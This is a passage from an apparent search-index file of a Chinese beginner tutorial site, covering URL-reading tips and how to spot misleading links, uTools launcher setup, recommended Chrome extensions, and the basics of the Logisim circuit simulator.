<p>\u6211\u60f3\u770b\u770b\u8fd9\u4e2a\u7f51\u7ad9\u6709\u6ca1\u6709\u66f4\u597d\u7684\u529f\u80fd\uff1a\u6bd4\u5982\u8ba1\u7b97\u884c\u5217\u5f0f\u7684\u503c\u3001\u5e42\uff1b\u751a\u81f3\u80fd\u4e0d\u80fd\u8ba1\u7b97\u5fae\u79ef\u5206\u6765\u68c0\u9a8c\u6211\u5e73\u65f6\u4f5c\u4e1a\u7684\u6b63\u786e\u6027\u3002\uff08\u65e0\u4e0d\u826f\u5f15\u5bfc\uff0c\u8bf7\u6b63\u786e\u4f7f\u7528\uff09</p> <p>\u90a3\u6211\u4eec\u76f4\u63a5\u628a\u540e\u9762\u7684\u76f4\u63a5\u5220\u6389\uff08\u5176\u5b9e\u770b\u770b\u5220\u9664\u90e8\u5206\u548c\u9ec4\u8272\u6846\u5185\u7684\u662f\u4e00\u6837\u7684\uff0c\u5bf9\u5e94\u4e86 url \u7f16\u7801\u7f62\u4e86\uff09\u53ea\u7559\u5fc5\u8981\u90e8\u5206\uff1a</p> <pre><code>https://www.wolframalpha.com/\n</code></pre> <p>\u7136\u540e\u4f60\u5c31\u53d1\u73b0\u4e86\u65b0\u4e16\u754c\ud83e\udd2a\u3002\uff08\u65e0\u4e0d\u826f\u5f15\u5bfc\uff0c\u8bf7\u6b63\u786e\u4f7f\u7528\uff09</p>","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#_6","title":"\u5b50\u57df\u540d","text":"<pre><code>https://note.tonycrane.cc/\n</code></pre> <p>\u719f\u6089 url \u7684\u8bdd\u5c31\u80fd\u591f\u770b\u5230\u524d\u9762\u7684\u5b50\u57df\u540d <code>note</code> \uff0c\u8fd9\u4e5f\u5bf9\u5e94\u4e86 \u7b14\u8bb0 \u8fd9\u4e00\u5b57\u6837\uff1b\u90a3\u4e48\u5f88\u53ef\u80fd\u539f\u57df\u540d</p> <pre><code>https://tonycrane.cc/\n</code></pre> <p>\u4e5f\u662f\u53ef\u8bbf\u95ee\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u770b\u5230\u5927\u4f6c\u516c\u5f00\u7684\u66f4\u591a\u8d44\u6e90\u3002</p> <p>Warning</p> <p>\u4f46\u662f\u5207\u8bb0\uff0c\u638c\u63e1\u4e86\u80fd\u529b\u4e0d\u53ef\u4ee5\u7528\u4e8e\u975e\u6cd5\u884c\u4e3a\uff0c\u8bf7\u63a7\u5236\u7a0b\u5ea6\uff0c\u4e0d\u8981\u5230\u7a83\u53d6\u4fe1\u606f\u3001\u4fb5\u72af\u9690\u79c1\u7684\u5730\u6b65\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#_7","title":"\u4e0d\u5bb9\u6613\u88ab\u94fe\u63a5\u6b3a\u9a97","text":"","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#1","title":"\u4f8b 1","text":"<p>\u4e00\u4e2a\u5f88\u611a\u8822\u4f46\u662f\u5f88\u7ecf\u5178\u7684\u4f8b\u5b50\uff0c\u4f60\u770b\u5230\u4e86\u4e00\u6bb5\u6587\u5b57\uff0c\u5199\u7684\u662f\uff1a</p> <pre><code>\u5176\u5b9e\u9ad8\u8003\u51fa\u5206\u524d\u8fd8\u53ef\u4ee5\u505a\u4e0b\u9762\u8fd9\u4e9b\u63aa\u65bd\u51cf\u5c11\u5931\u5206\uff01\nhttps://zhidao.baidu.com/question/150256286.html\n</code></pre> <p>\u5148\u4e0d\u8bf4\u8fd9\u53e5\u8bdd\u5047\u4e0d\u5047\u5427\uff0c\u4f60\u770b\u8fd9\u4e2a <code>zhidao.baidu.com</code> \uff0c\u731c\u4e5f\u662f\u201c\u767e\u5ea6\u77e5\u9053\u201d\uff0c\u771f\u80fd\u8fd9\u4e48\u516c\u5f00\u80fd\u653e\u767e\u5ea6\u4e0a\u53bb\uff1f<code>question</code> \u731c\u6d4b\u662f\u522b\u4eba\u63d0\u95ee\u505a\u51fa\u7684\u56de\u7b54\uff0c\u80fd\u5728\u8fd9\u91cc\u56de\u7b54\u8fd9\u79cd\u95ee\u9898\u771f\u662f\u89c1\u9b3c\u4e86\u3002\u613f\u610f\u76f8\u4fe1\u7684\u70b9\u5f00\u770b\u770b\u4e5f\u65e0\u59a8</p>","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#2","title":"\u4f8b 2","text":"<p>\u518d\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <p></p> <p><code>.edu.cn</code> \u662f\u4e2d\u56fd\u6559\u80b2\u76f8\u5173\u7f51\u7ad9\u7684\u901a\u7528\u9876\u7ea7\u57df\u540d\u3002\u8fd9\u4e2a\u57df\u540d\u901a\u5e38\u7528\u4e8e\u4e2d\u56fd\u7684\u6559\u80b2\u673a\u6784\u3001\u5927\u5b66\u3001\u4ee5\u53ca\u5176\u4ed6\u4e0e\u6559\u80b2\u76f8\u5173\u7684\u7ec4\u7ec7\u3002\u4f60\u8bf4\u5b98\u65b9\u67e5\u6210\u7ee9\uff0c\u53ef\u80fd\u53ef\u4fe1\u5427\uff1b\u4f46\u662f whu \uff0c\u5927\u5bb6\u81ea\u5df1\u641c\u641c\u662f\u54ea\u4e2a\u5427\ud83d\ude01\uff1b\u201c\u865a\u5047\u6210\u7ee9\u67e5\u8be2\u7f51\u7ad9\u201d \u662f hust \ud83e\udd23\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Utools_begin/","title":"Utools begin","text":"Summary <p>uTools \u662f\u4e00\u6b3e\u529f\u80fd\u5f3a\u5927\u7684 PC \u7aef\u7cfb\u7edf\u5de5\u5177\uff0c\u5f3a\u8c03\u5feb\u6377\u9ad8\u6548\u3002</p> <ul> <li>\u5b89\u88c5/\u521d\u4f7f\u7528\uff1a \u4e0b\u8f7d\u5b89\u88c5 uTools\uff0c\u8bbe\u7f6e\u5feb\u6377\u952e\u4e3a <code>Ctrl + space</code>\u3002</li> <li>\u8fdb\u9636\u63a8\u8350\uff1a \u5173\u95ed\u60ac\u6d6e\u7403\uff0c\u4f7f\u7528\u957f\u6309\u9f20\u6807\u53f3\u952e\u5f39\u51fa\u9762\u677f\u3002</li> <li>\u63d2\u4ef6\u63a8\u8350\uff1a \u672c\u5730\u641c\u7d22\u3001\u526a\u8d34\u677f\u3001\u7f51\u9875\u5feb\u5f00\u3001\u8baf\u98de OCR\u3001\u8d85\u7ea7\u6587\u672c\u7f16\u8f91\u5668\u3001\u622a\u56fe\u5de5\u5177\u3001ChatGPT Next\u3002</li> <li>\u5168\u5c40\u5feb\u6377\u952e\u63a8\u8350\uff1a \u8bbe\u7f6e\u5e38\u7528\u529f\u80fd\u7684\u5168\u5c40\u5feb\u6377\u952e\uff0c\u907f\u514d\u4e0e\u5e38\u89c1\u70ed\u952e\u51b2\u7a81\u3002</li> </ul> <p>utools \u662f\u4e00\u4e2a\u5728 PC \u7aef\u7684\u5f3a\u5927\u7cfb\u7edf\u5de5\u5177\uff0c\u201c\u547c\u4e4b\u5373\u6765\uff0c\u5373\u7528\u5373\u8d70\u201d\u662f\u5176\u4fe1\u6761\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Utools_begin/#_1","title":"\u5b89\u88c5/\u521d\u4f7f\u7528","text":"<p>utools </p> <p>\u5b98\u65b9\u5165\u95e8</p>","tags":["begin"]},{"location":"tutorial/begin/Utools_begin/#_2","title":"\u8fdb\u9636\u63a8\u8350","text":"<p>\u8fd9\u91cc\u53ef\u80fd\u4e0e\u4e0a\u9762\u6709\u6240\u91cd\u5408\uff0c\u95ee\u9898\u4e0d\u5927\uff0c\u4e3b\u8981\u4ecb\u7ecd\u6211\u4e2a\u4eba\u7684\u4f7f\u7528\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Utools_begin/#_3","title":"\u4e00\u4e9b\u4fee\u6539","text":"<p>\u53f3\u4e0a\u89d2\u5934\u50cf/\u7ba1\u7406\u4e2d\u5fc3 &gt; \u4e2a\u4eba\u4e2d\u5fc3 &gt; \u8bbe\u7f6e\u4e2d\uff1a</p> <ul> <li>\u547c\u51fa\u5feb\u6377\u952e\uff1a<code>Ctrl + space</code><ul> <li><code>Alt + space</code> \u79bb\u5f97\u592a\u8fd1\u4e86\uff0c\u4e0d\u65b9\u4fbf\u4e00\u4e2a\u624b\u6309\u3002</li> </ul> </li> <li>\u60ac\u6d6e\u7403\uff1a<code>\u5173\u95ed</code><ul> <li>\u6211\u4eec\u671f\u671b\u51cf\u5c11\u9f20\u6807\u7684\u4f7f\u7528\uff0c\u5feb\u6377\u952e\u5c31\u591f\u4e86\u3002</li> </ul> </li> <li>\u5f39\u51fa\u9762\u677f\uff1a<code>\u957f\u6309\u9f20\u6807\u53f3\u952e</code><ul> <li>\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u4e2d\u53ef\u4ee5\u957f\u6309\u4e2d\u952e\u6765\u6eda\u52a8\u5c4f\u5e55\uff0c\u6240\u4ee5\u4e2a\u4eba\u8ba4\u4e3a\u4e0d\u8981\u5360\u636e\u4e2d\u952e\uff1b</li> <li>\u5f53\u7136\u9f20\u6807\u6bd4\u8f83\u9ad8\u7ea7\u7684\u53ef\u4ee5\u7528\u4fa7\u952e\u3002</li> </ul> </li> <li>\u5f00\u673a\u542f\u52a8\uff1a<code>\u6253\u5f00</code><ul> <li>\u5982\u679c\u50cf\u6211\u4e00\u6837\u786e\u5b9e\u91cd\u5ea6\u4f9d\u8d56\u4e86\uff0c\u5efa\u8bae\u6253\u5f00\uff1b</li> <li>\u4e0d\u6025\uff0c\u770b\u5b8c\u4e0b\u9762\u518d\u51b3\u5b9a\u4e5f\u4e0d\u8fdf\u3002</li> </ul> </li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Utools_begin/#_4","title":"\u63d2\u4ef6\u63a8\u8350","text":"<p>\u5728\u4e4b\u524d\u7684\u5b98\u65b9\u6587\u6863\u4e2d\u4e5f\u63d0\u53ca\u4e86\u70ed\u95e8\u63d2\u4ef6\u5e94\u7528\uff0c\u8fd9\u91cc\u505a\u4e00\u4e9b\u4fee\u6539\u548c\u8865\u5145\u3002</p> <ul> <li>\u672c\u5730\u641c\u7d22<ul> <li>\u53ef\u4ee5\u8ddf\u968f\u6307\u5f15\u96c6\u6210 everything\uff0c\u4f7f\u7528\u4f53\u9a8c\u66f4\u4f73\uff1b</li> <li>\u5bf9\u4e8e\u6bcf\u6b21\u5f00\u673a\u540e\u7684\u6587\u4ef6\u7d22\u5f15\uff0c\u6211\u8fd9\u662f\u4e00\u822c\u4e0d\u5230 5s\uff0c\u4e14\u6bcf\u6b21\u5f00\u673a\u7d22\u5f15\u4e00\u6b21\u5373\u53ef\uff1b</li> <li>\u8bb0\u5f97\u5f00\u4e0b\u9762\u6700\u540e\u4e00\u4e2a\uff0c\u5176\u4ed6\u4e0d\u59a8\u81ea\u5df1\u5c1d\u8bd5\u611f\u53d7\u4e00\u4e0b\u3002</li> </ul> </li> <li>\u526a\u8d34\u677f</li> <li>\u7f51\u9875\u5feb\u5f00</li> <li>Latex \u516c\u5f0f\u7f16\u8f91&amp;\u8bc6\u522b<ul> <li>\u544a\u522b\u624b\u6253 Latex \u516c\u5f0f\uff1b\u4f3c\u4e4e\u662f\u7528\u989d\u5ea6\u7684\uff1f \u597d\u4e45\u4e4b\u524d\u5f00\u59cb\u7528\u7684\uff0c\u5fd8\u4e86\u3002</li> </ul> </li> <li>\u6613\u7ffb\u7ffb\u8bd1<ul> <li>\u611f\u89c9\u6bd4 \u201c\u805a\u5408\u7ffb\u8bd1\u201d \u597d\u7528\uff1b</li> <li>\u641e\u4e2a\u6709\u9053\u4ec0\u4e48\u7684 api\uff0c\u591f\u7528\u4e86\u3002</li> </ul> </li> <li>\u4e07\u80fd\u6587\u4ef6\u6d4f\u89c8\u5668<ul> <li>\u653e\u5728\u8d85\u7ea7\u9762\u677f\u4e2d\u8fd8\u662f\u633a\u65b9\u4fbf\u7684\uff0c\u53ef\u4ee5\u9884\u89c8\u538b\u7f29\u5305\u3001\u97f3\u9891\u7b49\u7b49\u3002</li> </ul> </li> <li>\u4e66\u7b7e\u4e0e\u5386\u53f2\u8bb0\u5f55<ul> <li>\u6309\u7167\u63d0\u793a\u914d\u7f6e\u597d\u5373\u53ef\uff1b</li> <li>\u4e2a\u4eba\u6dfb\u52a0\u4e86\uff1a<ul> <li>Google Chrome</li> <li>Visual Studio Code</li> <li>Obsidian \uff08\u6211\u81ea\u5df1\u662f\u53ea\u6709\u4e00\u4e2a vault\uff0c\u4e0d\u77e5\u9053\u591a vaults \u4f1a\u4e0d\u4f1a\u51fa\u9519\uff09</li> </ul> </li> </ul> </li> <li>\u8d85\u7ea7\u6587\u672c\u7f16\u8f91\u5668<ul> <li>\u7c7b\u4f3c\u4e8e vscode \u7684\u7f16\u8f91\u5668\uff0c\u629b\u5f03\u4e11\u964b\u7684\u8bb0\u4e8b\u672c\uff1b</li> <li>\u53ef\u4ee5\u9009\u4e2d\u6587\u4ef6\u540e\u5728\u8d85\u7ea7\u9762\u677f\u4e2d\u6253\u5f00\uff1b</li> <li>\u53ef\u4ee5\u5f53\u4f5c\u4e34\u65f6\u4e00\u6bb5\u6587\u5b57\uff0c\u56fa\u5b9a\u5728\u5c4f\u5e55\u4e0a\u3002</li> </ul> </li> <li>\u622a\u56fe\u5de5\u5177 Plus<ul> <li>\u53ef\u4ee5\u76f4\u63a5\u4fdd\u5b58\uff0c\u6216\u8005\u8fdb\u884c\u6807\u6ce8\uff0c\u60ac\u6d6e\u7f6e\u9876\u3002</li> </ul> </li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Utools_begin/#_5","title":"\u5168\u5c40\u5feb\u6377\u952e\u63a8\u8350","text":"<p>\u5982\u4e0b\uff0c\u5e38\u7528\u529f\u80fd\u66f4\u52a0\u63a8\u8350\u52a0\u5165\u5168\u5c40\u5feb\u6377\u952e\uff0c\u6ce8\u610f\u4e0d\u8981\u548c\u5e38\u89c1\u7684\u70ed\u952e\u51b2\u7a81\u5373\u53ef\uff1a</p> <p></p> <p>\u9664\u6b64\u4e4b\u5916\uff0cutools \u4e0a\u8fd8\u6709\u4e0d\u5c11\u70ed\u95e8\u7684\u6587\u6863\uff0c\u5982\u679c\u6b63\u5728\u505a\u4ec0\u4e48\uff0c\u4e0d\u59a8\u627e\u627e\u6709\u6ca1\u6709\u6587\u6863\u53ef\u4ee5\u968f\u624b\u67e5\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/chrome_begin/","title":"Chrome begin","text":"<p>\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u7684\u662f\u6211\u5bf9 chrome browser \u7684\u4e00\u4e9b\u63d2\u4ef6\u548c\u8bbe\u7f6e\u5206\u4eab\uff1bedge \u4e0a\u53ef\u80fd\u4e5f\u6709\u540c\u540d\u63d2\u4ef6\uff0c\u4f46\u662f\u4e0b\u9762\u63d0\u4f9b\u7684\u94fe\u63a5\u90fd\u662f chrome store \uff0c\u81ea\u5907\u9b54\u6cd5\uff0c\u6216\u8005\u81ea\u5df1\u627e\u6e20\u9053\u8bd5\u8bd5\u3002</p> <p>chrome_begin \u8fd9\u4e2a\u540d\u5b57\u53d6\u5f97\u6709\u70b9\u552c\u4eba\uff08\u4e3b\u8981\u662f\u6bd4\u8f83\u9002\u5408\u52a0\u5165 begin \u7cfb\u5217\uff09\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/chrome_begin/#i-extensions","title":"I Extensions","text":"<ul> <li>workspaces<ul> <li>\u4fdd\u7559\u4e00\u7ec4\u6253\u5f00\u7684\u6d4f\u89c8\u5668\u6807\u7b7e\u9875\uff0c\u65b9\u4fbf\u4e34\u65f6\u5207\u6362\u5de5\u4f5c\u540e\u56de\u590d\u3002</li> </ul> </li> <li>bilibili \u54d4\u54e9\u54d4\u54e9\u4e0b\u8f7d\u52a9\u624b<ul> <li>\u987e\u540d\u601d\u4e49\u3002</li> </ul> </li> <li>Dark Reader<ul> <li>\u6bd4\u8f83\u597d\u7684\u5c06\u6240\u6709 Light \u754c\u9762\u53d8\u4e3a Dark \u6a21\u5f0f\uff0c\u6df1\u591c\u964d\u4f4e\u5c4f\u5e55\u4eae\u5ea6\u3002</li> </ul> </li> <li>Kimi \u6d4f\u89c8\u5668\u52a9\u624b<ul> <li>Kimi \u5b98\u65b9 2024/07 \u51fa\u53f0\u7684\u63d2\u4ef6\uff1b</li> <li>\u91cd\u70b9\u5728\u4e8e\u5176\u80fd\u591f\u5212\u8bcd/\u53e5\uff0c\u5e76\u7ed3\u5408\u4e0a\u4e0b\u6587 \u89e3\u91ca\u3002</li> </ul> </li> <li>Page Sidebar | Open any page in side panel<ul> <li>chrome \u6ca1\u6709 edge \u7684\u7f51\u9875\u5206\u5c4f\u529f\u80fd\uff0c\u8fd9\u4e2a\u63d2\u4ef6\u53ef\u4ee5\u57fa\u672c\u5e73\u66ff\uff1b</li> </ul> </li> <li>VertiTab - Vertical Tabs in Side Panel</li> <li>\u5e7f\u544a\u62e6\u622a\u5668<ul> <li>\u4e2a\u4eba\u8bc4\u4ef7\u4e00\u4e2a\u5e7f\u544a\u62e6\u622a\u5668\u4e3b\u8981\u770b\uff1a<ul> <li>\u80fd\u5426\u5f88\u597d\u5730\u62e6\u622a\u5e7f\u544a\uff0c\u6709\u4e9b\u63d2\u4ef6\u4f60\u4e0d\u4ed8\u8d39\u6545\u610f\u7ed9\u4f60\u653e\u51fa\u4e00\u4e9b\u6765\uff1b</li> <li>DevTools \u4e2d\u7684 Console \u662f\u5426\u7206\u51fa\u8bb8\u591a\u9519\u8bef\uff1b\u8fd9\u4e00\u70b9 AdGuard \u505a\u7684\u7a0d\u597d\u4e00\u4e9b\u3002</li> </ul> </li> <li>AdGuard</li> <li>\u5e7f\u544a\u62e6\u622a\u5668 - 1Block</li> </ul> </li> <li>\u6c89\u6d78\u5f0f\u7ffb\u8bd1 - \u7f51\u9875\u7ffb\u8bd1\u63d2\u4ef6 | PDF\u7ffb\u8bd1 | \u514d\u8d39<ul> <li>\u4f7f\u7528\u8c37\u6b4c/\u5fae\u8f6f\u7b49\u8fdb\u884c\u7ffb\u8bd1\uff0c\u53ef\u4ee5\u81ea\u5df1\u63a5\u5165\u4e3b\u6d41\u6a21\u578b\u7684 api\uff0c\u4e2a\u4eba\u4f7f\u7528\u524d\u4e24\u4e2a\u5c31\u591f\u4e86\uff1b</li> <li>\u4e3b\u8981\u662f\u53ef\u4ee5\u5bf9\u7167\u7ffb\u8bd1\uff0c\u5373\u4fdd\u7559\u4e86\u539f\u6587\uff0c\u4e14\u53ef\u4ee5\u8bbe\u7f6e\u8bd1\u6587\u683c\u5f0f\uff0c\u4f53\u9a8c\u76f8\u5bf9\u66f4\u597d<ul> <li></li> </ul> </li> </ul> </li> <li>\u7be1\u6539\u7334<ul> <li>\u7528\u4e8e\u6267\u884c\u4f17\u591a\u811a\u672c\uff0c\u7f51\u4e0a\u4ecb\u7ecd\u751a\u591a\uff0c\u5728\u6b64\u7565\u8fc7\u3002</li> </ul> </li> <li>Tabliss<ul> <li>\u4e00\u4e2a\u4e0d\u9519\u7684\u6807\u7b7e\u9875\uff0c\u7b80\u6d01\u597d\u770b\uff1b</li> <li>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4e2a\u4eba\u8bbe\u8ba1\uff1a</li> <li>\u6bd4\u8f83\u5947\u602a\u7684\u662f\uff0c\u8fd9\u4e2a\u5185\u5b58\u6d88\u8017\u5c45\u7136\u53ea\u6709 chrome \u539f\u751f\u7684\u4e00\u534a\ud83d\ude05\u3002</li> </ul> </li> </ul>","tags":["begin"]},{"location":"tutorial/begin/chrome_begin/#ii-setting","title":"II setting","text":"<ul> <li>chrome://flags/enable-tab-audio-muting<ul> <li>\u5355\u72ec\u63a7\u5236\u4e0d\u540c\u6807\u7b7e\u9875\u58f0\u97f3\uff1b</li> </ul> </li> </ul>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/","title":"Logisim begin","text":"Summary <p>Logisim \u662f\u4e00\u6b3e\u7528\u4e8e\u5b66\u4e60\u8ba1\u7b97\u673a\u7cfb\u7edf\u548c\u6570\u5b57\u903b\u8f91\u7535\u8def\u7684\u8f6f\u4ef6\u3002</p> <ul> <li>\u7535\u7ebf\uff1a \u4e0d\u540c\u989c\u8272\u7684\u7535\u7ebf\u4ee3\u8868\u4e0d\u540c\u7684\u542b\u4e49\u3002</li> <li>\u5f15\u811a\uff1a \u53ef\u4ee5\u6dfb\u52a0\u8f93\u5165/\u8f93\u51fa\u5f15\u811a\uff0c\u5e76\u6539\u53d8\u6570\u636e\u4f4d\u5bbd\u548c\u8f93\u5165\u503c\u3002</li> <li>Wiring \u5de5\u5177\uff1a \u5305\u62ec\u63a2\u9488\u3001\u5e38\u91cf\u3001\u96a7\u9053\u3001\u5206\u7ebf\u5668\u7b49\uff0c\u7528\u4e8e\u4fe1\u53f7\u4f20\u8f93\u548c\u5904\u7406\u3002</li> <li>MUX\uff08\u591a\u8def\u9009\u62e9\u5668\uff09\uff1a \u6839\u636e\u9009\u62e9\u7aef\u4fe1\u53f7\u9009\u62e9\u8f93\u5165\u7aef\u53e3\u3002</li> <li>Register\uff08\u5bc4\u5b58\u5668\uff09\uff1a \u7528\u4e8e\u5b58\u50a8\u6570\u636e\u3002</li> <li>\u81ea\u5b9a\u4e49\u5c01\u88c5\u7535\u8def\uff1a \u53ef\u4ee5\u521b\u5efa\u81ea\u5df1\u7684\u7535\u8def\u6a21\u5757\u3002</li> </ul> <p>\u5bf9\u4e8e\u6bcf\u4e00\u4f4d\u5b66\u4e60\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u8005\u6570\u5b57\u903b\u8f91\u7535\u8def\u7684 zjuer\uff0clogisim \u662f\u5fc5\u987b\u4f7f\u7528\u7684\uff0c\u4e0b\u9762\u5c06\u8f83\u4e3a\u8be6\u7ec6\u5730\u4ecb\u7ecd\u5176\u4f7f\u7528\u65b9\u6cd5\u3002</p> <p>Prerequisite</p> <ul> <li> <p>\u5b89\u88c5 logisim-evolution \u5e76\u5b66\u4f1a\u542f\u52a8</p> </li> <li> <p>\u6e05\u695a\u57fa\u672c\u7684\u6982\u5ff5\uff0c\u5982\u5f15\u811a\u3001\u53cd\u76f8\u5668\u53ca\u5bf9\u5e94\u56fe\u6807\uff0c\u7ebf\u8def\u8fde\u63a5\u539f\u7406 </p> </li> </ul> <p>Env</p> <ul> <li>logisim-evolution-3.8.0-all.jar</li> </ul> <p>Tip</p> <p>File =&gt; Prefence =&gt; Language =&gt; cn/cn \u53ef\u4ee5\u8bbe\u7f6e\u4e2d\u6587</p> <p>\u4f46\u662f\u4e0d\u662f\u5f88\u5efa\u8bae\u3002</p> <p>\u57fa\u672c\u4f7f\u7528\u53ef\u4ee5\u5148\u770bLogisim \u6559\u7a0b</p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#_1","title":"\u7535\u7ebf","text":"<p>\u4e0b\u9762\u662f\u7535\u7ebf\u989c\u8272\u4ee3\u8868\u542b\u4e49</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#_2","title":"\u5f15\u811a","text":"","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#_3","title":"\u5f15\u811a\u7684\u6dfb\u52a0","text":"<p>\u4e0b\u9762\u662f\u8f93\u5165\u5f15\u811a\uff08\u8f93\u51fa\u5f15\u811a\u540c\u7406\uff09\u6dfb\u52a0\u6b65\u9aa4\uff1a\uff08\u692d\u5706\u8868\u793a\u8d77\u59cb\u6b65\u9aa4\uff0c\u4e0b\u540c\uff09</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#_4","title":"\u5f15\u811a\u7684\u4f7f\u7528","text":"<p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u53ef\u4ee5\u6539\u53d8\u6570\u636e\u4f4d\u5bbd(data bits)\uff0c\u901a\u8fc7\u201c\u624b\u6307\u201d\u53ef\u4ee5\u70b9\u51fb\u6539\u53d8\u8f93\u5165 0/1</p> <p>\u5f15\u811a\u5185\u90e8\u6570\u5b57\u7684\u6392\u5217\u987a\u5e8f\u4e0e\u4e8c\u8fdb\u5236\u76f8\u540c\uff0c\u6211\u4eec\u4ea6\u53ef\u4ee5\u8bf4\u56fe\u4e2d\u8f93\u5165\u7684\u662f 3'b010\uff08\u5373\u7acb\u5373\u6570\uff09 \u7acb\u5373\u6570\u7ebf\u8def\u6570\u7ec4\u00b6</p> <p>\u7acb\u5373\u6570\u6570\u7ec4\u7531\u4e09\u90e8\u5206\u7ec4\u6210\u00a0:\u00a0<code>imm = LEN ' BASE NUM</code> </p> <ul> <li>\u7b2c\u4e00\u90e8\u5206\u00a0LEN\u00a0\u662f\u7acb\u5373\u6570\u7684\u7ebf\u8def\u957f\u5ea6\uff0cLEN=3\u00a0\u8868\u793a\u7acb\u5373\u6570\u5927\u5c0f\u4e3a\u00a03\u00a0\u4f4d\u7ebf\u8def</li> </ul> <ul> <li>\u7b2c\u4e8c\u90e8\u5206\u00a0BASE\u00a0\u8868\u793a\u7acb\u5373\u6570\u7684\u8fdb\u5236\uff0cb\u3001d\u3001h\u00a0\u5206\u522b\u8868\u793a\u4e8c\u8fdb\u5236\u3001\u5341\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236</li> </ul> <ul> <li>\u7b2c\u4e09\u90e8\u5206\u00a0NUM\u00a0\u662f\u5bf9\u5e94\u7acb\u5373\u6570\u7684\u503c\uff0c\u5fc5\u987b\u548c\u00a0BASE\u00a0\u6307\u793a\u7684\u8fdb\u5236\u76f8\u5bf9\u5e94\uff0c\u4f8b\u5982\u00a04'b98\u00a0\u5c31\u662f\u975e\u6cd5\u7684</li> </ul> <p>\u5c06\u7acb\u5373\u6570\u8f6c\u5316\u4e3a\u7535\u8def\u7684\u65b9\u6cd5\u5982\u4e0b\uff1a 1. \u5c06\u7acb\u5373\u6570\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u7684\u00a001\u00a0\u4e32\uff0c\u5982\u679c\u00a001\u00a0\u4e32\u4f4d\u6570\u5c11\u4e8e\u00a0LEN\u00a0\u5219\u5728\u524d\u9762\u8865\u00a00\uff0c\u5982\u679c\u5927\u4e8e\u00a0LEN\u00a0\u5219\u9ad8\u4f4d\u622a\u65ad </p> <ol> <li>\u7acb\u5373\u6570\u7684\u00a00\u00a0\u8868\u793a\u8be5\u7ebf\u8def\u7684\u8f93\u5165\u662f\u00a0GND\uff0c\u7acb\u5373\u6570\u662f\u00a01\u00a0\u8868\u793a\u8be5\u7ebf\u8def\u8f93\u5165\u662f\u00a0VCC</li> </ol> <ol> <li>\u7acb\u5373\u6570\u7684\u00a001\u00a0\u4e32\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u4f9d\u6b21\u662f\u00a0IMM[0], IMM[1], ..., IMM[LEN-1]</li> </ol> <pre><code>3'b01 // 3'b001 \n6'd67 // 6'b1000011 -&gt; 6'b000011 \n16'h1234 // 16'b0001001000110100\n</code></pre> <p>\u6539\u53d8\u8f93\u5165\u5f15\u811a\u7684\u8f93\u5165\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7ebf\u8def\u989c\u8272\u53d8\u4e86\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u904d\u5386\u4e0d\u540c\u7684\u8f93\u5165\u89c2\u5bdf\u8f93\u51fa\u4e86\uff01</p> <p>tips:</p> <ul> <li>\u60f3\u6539\u53d8\u5f15\u811a\u671d\u5411\uff1f\u9009\u4e2d\u5f15\u811a\u540e\u4e0a\u4e0b\u5de6\u53f3\u65b9\u5411\u952e\u5373\u53ef\uff01</li> <li>\u53cc\u51fb\u5f15\u811a\u53ef\u4ee5\u547d\u540d\u54e6\uff0c\u8fd9\u5bf9\u4e8e\u5bfc\u51fa\u7535\u8def\u975e\u5e38\u91cd\u8981\uff08\u6ce8\u610f\u5b57\u6bcd\u5927\u5c0f\u5199\uff01\uff09</li> </ul>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#wiring","title":"Wiring \u5de5\u5177","text":"<p>\u9875\u9762\u4e0a\u76f4\u63a5\u80fd\u770b\u89c1\u7684\u5de5\u5177\u6211\u4eec\u4e0d\u518d\u8bb2\u89e3\uff0c\u6765\u770b\u770b Wiring \u4e2d\u7684\u5de5\u5177</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#probe","title":"probe\uff08\u63a2\u9488\uff09","text":"<p>\u83b7\u5f97\u7ebf\u8def\u4fe1\u53f7</p> <p></p> <p>\u4e0d\u8fc7\u5176\u5b9e\u7528\u201c\u624b\u6307\u201d\u70b9\u7ebf\u8def\u5c31\u80fd\u770b\u5230\u4fe1\u53f7\uff0c\u63a2\u9488\u9002\u7528\u4e8e\u9700\u8981\u89c2\u5bdf\u591a\u6761\u7ebf\u8def\u4fe1\u53f7</p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#constant","title":"Constant\uff08\u5e38\u91cf \uff09","text":"<p>\u987e\u540d\u601d\u4e49\uff0c\u5f53\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\uff08\u5c40\u90e8\uff09\u552f\u4e00\u7684\u8f93\u5165\u65f6\u4f7f\u7528\uff0c\u540c\u6837\u53ef\u4ee5\u6539\u53d8\u4f4d\u5bbd\u3001\u503c</p> <p></p> <p>\u6ce8\u610f\uff0c\u503c <code>Value</code> \u4f7f\u7528 16 \u8fdb\u5236\u8868\u793a</p> 